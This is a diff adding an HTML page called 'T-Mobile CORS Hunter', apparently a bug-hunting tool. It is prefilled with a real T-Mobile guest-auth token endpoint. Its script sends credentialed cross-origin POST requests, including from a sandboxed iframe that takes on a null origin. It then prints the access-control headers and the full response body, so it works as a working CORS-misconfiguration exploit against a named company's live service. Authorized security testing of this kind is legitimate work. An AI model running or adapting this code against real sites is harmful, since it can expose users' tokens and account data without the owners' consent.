@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>T-Mobile Multi-Target CORS Tester</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 30px; background: #f0f2f5; }
+        .card { max-width: 800px; margin: auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border-top: 8px solid #e20074; }
+        h2 { color: #e20074; margin-top: 0; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-family: monospace; }
+        button { background: #e20074; color: white; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; width: 49%; }
+        button.alt { background: #333; }
+        #output { margin-top: 20px; background: #1e1e1e; color: #4af626; padding: 20px; border-radius: 8px; min-height: 200px; overflow: auto; white-space: pre-wrap; font-family: 'Consolas', monospace; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>T-Mobile CORS Hunter</h2>
+    <p>Paste a URL from your scanner results below to test for a credentialed data leak.</p>
+    
+    <input type="text" id="targetUrl" value="https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens" placeholder="Enter target URL here...">
+    
+    <div style="display: flex; justify-content: space-between;">
+        <button onclick="testCORS('standard')">Standard Test</button>
+        <button class="alt" onclick="testCORS('null')">Null Origin Test</button>
+    </div>
+
+    <pre id="output">Results will appear here...</pre>
+</div>
+
+<iframe id="sb" sandbox="allow-scripts" style="display:none;"></iframe>
+
+<script>
+    function testCORS(type) {
+        const url = document.getElementById('targetUrl').value;
+        const out = document.getElementById('output');
+        out.innerText = "Testing " + type + " origin against:\n" + url + "\n\nLoading...";
+
+        if (type === 'standard') {
+            fetch(url, { method: 'POST', mode: 'cors', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: '{}' })
+            .then(r => {
+                const acao = r.headers.get('Access-Control-Allow-Origin');
+                const acac = r.headers.get('Access-Control-Allow-Credentials');
+                return r.text().then(t => {
+                    out.innerText = "STATUS: " + r.status + "\nACAO: " + (acao || "None") + "\nACAC: " + (acac || "None") + "\n\nBODY:\n" + t;
+                });
+            })
+            .catch(e => { out.innerText = "BLOCKED BY BROWSER (CORS):\n" + e.message; });
+        } else {
+            const frame = document.getElementById('sb');
+            frame.srcdoc = `<script>
+                fetch('${url}', { method: 'POST', mode: 'cors', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: '{}' })
+                .then(r => r.text().then(t => window.parent.postMessage({s: r.status, b: t, a: r.headers.get('Access-Control-Allow-Origin'), c: r.headers.get('Access-Control-Allow-Credentials')}, '*')))
+                .catch(e => window.parent.postMessage({err: e.message}, '*'));
+            <\/script>`;
+        }
+    }
+
+    window.addEventListener('message', e => {
+        const out = document.getElementById('output');
+        if (e.data.err) { out.innerText = "NULL ORIGIN BLOCKED:\n" + e.data.err; }
+        else { out.innerText = "NULL ORIGIN SUCCESS!\nSTATUS: " + e.data.s + "\nACAO: " + (e.data.a || "None") + "\nACAC: " + (e.data.c || "None") + "\n\nBODY:\n" + e.data.b; }
+    });
+</script>
+
+</body>
+</html>
